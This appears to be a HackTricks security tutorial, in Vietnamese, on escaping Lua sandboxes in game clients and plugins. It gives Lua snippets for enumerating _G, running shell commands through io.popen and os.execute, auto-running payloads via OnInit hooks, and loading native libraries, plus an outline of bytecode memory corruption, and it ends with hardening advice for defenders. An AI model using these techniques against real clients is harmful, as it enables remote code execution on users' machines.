# Bypass Lua sandboxes (VM nhúng, game client)

{{#include ../../../banners/hacktricks-training.md}}

Trang này tổng hợp các kỹ thuật thực tế để liệt kê và thoát khỏi các "sandbox" Lua được nhúng trong ứng dụng (đặc biệt là game client, plugin hoặc engine scripting trong ứng dụng). Nhiều engine cung cấp môi trường Lua bị hạn chế, nhưng vẫn để lộ các global mạnh, cho phép thực thi lệnh tùy ý hoặc thậm chí gây lỗi bộ nhớ native khi có thể truy cập bộ nạp bytecode.

Ý chính:
- Xem VM là một môi trường chưa biết: liệt kê _G và tìm các primitive nguy hiểm có thể truy cập.
- Khi stdout/print bị chặn, hãy lạm dụng bất kỳ kênh UI/IPC nào trong VM làm nơi xuất dữ liệu để quan sát kết quả.
- Nếu io/os bị lộ, bạn thường có thể thực thi lệnh trực tiếp (io.popen, os.execute).
- Nếu load/loadstring/loadfile bị lộ, thực thi bytecode Lua được tạo thủ công có thể phá vỡ an toàn bộ nhớ ở một số phiên bản (verifier ≤5.1 có thể bị bypass; verifier bị loại bỏ từ 5.2), cho phép khai thác nâng cao.

## Liệt kê môi trường sandbox

- Dump môi trường global để kiểm kê các bảng/hàm có thể truy cập:

```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
  out("=== DUMPING _G ===")
  for k, v in pairs(_G) do
    out(tostring(k) .. " = " .. tostring(v))
  end
end
```

- Nếu không có print(), hãy tận dụng lại các kênh trong VM. Ví dụ từ VM script nhà ở của một MMO, nơi chỉ có thể xuất nội dung chat sau khi gọi âm thanh; đoạn sau tạo một hàm xuất nội dung đáng tin cậy:<sup>[[1]](#references)</sup>

```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
  -- Some engines require enabling an audio channel before speaking
  H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
  return function(msg)
    H.Say(label or 1, msg)
  end
end

function OnMenu(menuNum)
  if menuNum ~= 3 then return end
  local out = ButlerOut(1)
  dump_globals(out)
end
```

Khái quát hóa mẫu này cho mục tiêu của bạn: mọi textbox, toast, logger hoặc UI callback chấp nhận chuỗi đều có thể đóng vai trò stdout để trinh sát.

## Thực thi lệnh trực tiếp nếu io/os được expose

Nếu sandbox vẫn expose các thư viện chuẩn io hoặc os, bạn có thể thực thi lệnh ngay lập tức:

```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```

Ghi chú:

- Việc thực thi diễn ra bên trong tiến trình client; nhiều lớp anti-cheat/antidebug chặn debugger bên ngoài sẽ không ngăn được việc tạo tiến trình trong VM.
- Ngoài ra, hãy kiểm tra: package.loadlib (nạp DLL/.so tùy ý), require với native modules, ffi của LuaJIT (nếu có) và debug library (có thể nâng quyền bên trong VM).

## Trigger zero-click qua callback auto-run

Nếu ứng dụng host đẩy script đến client và VM cung cấp các hook auto-run (ví dụ: OnInit/OnLoad/OnEnter), hãy đặt payload tại đó để xâm nhập drive-by ngay khi script được nạp:<sup>[[1]](#references)</sup>

```lua
function OnInit()
  io.popen("calc.exe") -- or any command
end
```

Mọi callback tương đương (OnLoad, OnEnter, v.v.) đều khái quát hóa kỹ thuật này khi script được truyền đến và tự động thực thi trên client.

## Các primitive nguy hiểm cần tìm trong quá trình recon

Khi liệt kê _G, hãy đặc biệt tìm:
- io, os: io.popen, os.execute, file I/O, truy cập env.
- load, loadstring, loadfile, dofile: thực thi source hoặc bytecode; hỗ trợ tải bytecode không đáng tin cậy.
- package, package.loadlib, require: tải thư viện động và bề mặt module.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo và hooks.
- Chỉ có trong LuaJIT: ffi.cdef, ffi.load để gọi trực tiếp native code.

Ví dụ sử dụng tối thiểu (nếu có thể truy cập):

API loader của Lua đã thay đổi qua các phiên bản: trong Lua 5.1, `load` đọc từ một hàm reader còn `loadstring` đọc từ một string; `load` của Lua 5.2 chấp nhận string hoặc hàm reader, còn `loadstring` đã bị deprecated vì có hàm tương đương là `load`.<sup>[[5]](#references)[[6]](#references)</sup>

```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```

## Escalation tùy chọn: lạm dụng Lua bytecode loaders

Khi có thể truy cập load/loadstring/loadfile nhưng io/os bị hạn chế, việc thực thi Lua bytecode được tạo thủ công có thể dẫn đến các primitive tiết lộ và làm hỏng bộ nhớ. Các điểm chính:
- Lua ≤ 5.1 được phát hành kèm một bytecode verifier có các cách bypass đã biết.<sup>[[4]](#references)</sup>
- Lua 5.2 đã loại bỏ hoàn toàn verifier (quan điểm chính thức: ứng dụng nên từ chối các chunk đã biên dịch sẵn), làm mở rộng bề mặt tấn công nếu không cấm tải bytecode.<sup>[[2]](#references)[[3]](#references)</sup>
- Quy trình thường là: leak con trỏ thông qua đầu ra trong VM, tạo bytecode gây nhầm lẫn kiểu (ví dụ quanh FORLOOP hoặc các opcode khác), rồi chuyển sang primitive đọc/ghi tùy ý hoặc thực thi mã native.<sup>[[2]](#references)[[4]](#references)</sup>

Hướng này phụ thuộc vào engine/phiên bản và đòi hỏi RE. Xem các tài liệu tham khảo để tìm hiểu sâu về các primitive khai thác và gadget mẫu trong game.

## Ghi chú về phát hiện và gia cố (dành cho người phòng thủ)

- Phía server: từ chối hoặc viết lại script của người dùng; allowlist các API an toàn; loại bỏ hoặc bind rỗng io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Phía client: chạy Lua với _ENV tối giản, cấm tải bytecode, bổ sung lại bytecode verifier nghiêm ngặt hoặc kiểm tra chữ ký, và chặn việc tạo tiến trình từ tiến trình client.
- Telemetry: cảnh báo khi gameclient tạo tiến trình con ngay sau khi tải script; đối chiếu với các sự kiện UI/chat/script.

## References

- [1] [Ngôi nhà này bị ma ám: RCE đã tồn tại cả thập kỷ trong client AION (chứa Lua VM cho nhà ở trong game)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Phân tích bytecode: Làm sáng tỏ các lỗ hổng bảo mật Lua của Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Thảo luận về việc loại bỏ bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Khai thác Lua 5.1 bytecode (gist về các cách bypass verifier/ghi chú)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Tài liệu tham khảo Lua 5.1](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Tài liệu tham khảo Lua 5.2](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
